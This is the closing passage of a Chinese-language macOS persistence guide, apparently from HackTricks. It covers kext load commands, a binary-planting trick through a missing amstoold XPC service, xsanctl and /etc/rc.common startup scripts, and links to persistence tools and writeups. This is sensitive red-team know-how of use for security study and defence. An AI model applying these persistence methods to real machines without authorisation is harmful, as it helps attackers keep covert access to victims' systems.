> 安装 kext 非常复杂，即使拥有 Root 权限也是如此，因此除非你拥有 exploit，否则不应将其视为一种实用的 sandbox-escape 或 persistence 技术。

#### 位置

若要将 KEXT 安装为启动项，必须将其**安装在以下位置之一**：

- `/System/Library/Extensions`
- OS X 操作系统内置的 KEXT 文件。
- `/Library/Extensions`
- 由第三方软件安装的 KEXT 文件

你可以使用以下命令列出当前已加载的 kext 文件：
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
有关 [**kernel extensions，请查看此部分**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers) 的更多信息。

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### 位置

- **`/usr/local/bin/amstoold`**
- 需要 Root 权限

#### 描述与利用

据称，`/System/Library/LaunchAgents/com.apple.amstoold.plist` 中的 `plist` 使用了此二进制文件，同时暴露了一个 XPC service……问题在于该二进制文件并不存在，因此你可以在那里放置某个文件；当 XPC service 被调用时，你的二进制文件就会被调用。<sup>[[35]](#references)</sup>

我现在已经无法在我的 macOS 中找到它了。

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### 位置

- **`/Library/Preferences/Xsan/.xsanrc`**
- 需要 Root 权限
- **触发条件**：service 运行时（很少发生）

#### 描述与利用

据称，运行此脚本并不常见，我甚至无法在我的 macOS 中找到它，因此如果你想了解更多信息，请查看该 writeup。<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **这在现代 MacOS 版本中不起作用**

也可以在这里放置**将在启动时执行的命令**。普通 rc.common 脚本示例：
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## 持久化技术和工具

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025，Infostealer 之年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [超越老牌 LaunchAgents - 1 - shell 启动文件](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [超越老牌 LaunchAgents - 18 - X11 和 XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [超越老牌 LaunchAgents - 21 - 重新打开的应用程序](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [超越老牌 LaunchAgents - 20 - Terminal 偏好设置](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [超越老牌 LaunchAgents - 13 - 音频插件](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit 插件 (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [超越老牌 LaunchAgents - 12 - QuickLook 插件](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [超越老牌 LaunchAgents - 22 - LoginHook 和 LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [超越老牌 LaunchAgents - 4 - cron 作业](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [超越老牌 LaunchAgents - 2 - iTerm2 启动](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [超越老牌 LaunchAgents - 7 - xbar 插件](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [超越老牌 LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [超越老牌 LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [超越老牌 LaunchAgents - 3 - 登录项](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [超越老牌 LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [超越老牌 LaunchAgents - 24 - 文件夹操作](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [macOS 上用于持久化的文件夹操作 (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [超越老牌 LaunchAgents - 27 - Dock 快捷方式](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [超越老牌 LaunchAgents - 17 - 颜色选择器](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [超越老牌 LaunchAgents - 26 - Finder Sync 插件](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [分析“Mac File Opener”持久化 (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [超越老牌 LaunchAgents - 16 - 屏幕保护程序](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [保持访问权限：用于 macOS 持久化的屏幕保护程序 (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [超越老牌 LaunchAgents - 11 - Spotlight 导入器](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [超越老牌 LaunchAgents - 9 - 偏好设置面板](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [超越老牌 LaunchAgents - 19 - 定期脚本](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [超越老牌 LaunchAgents - 5 - 可插拔认证模块 (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [超越老牌 LaunchAgents - 28 - 授权插件](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [使用授权插件进行持久化凭据窃取 (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [超越老牌 LaunchAgents - 30 - man 配置文件 - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [超越老牌 LaunchAgents - 25 - Apache2 模块](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [超越老牌 LaunchAgents - 31 - BSM 审计框架](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [超越老牌 LaunchAgents - 23 - emond，事件监控守护进程](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [超越老牌 LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [超越老牌 LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
{{#include ../banners/hacktricks-training.md}}
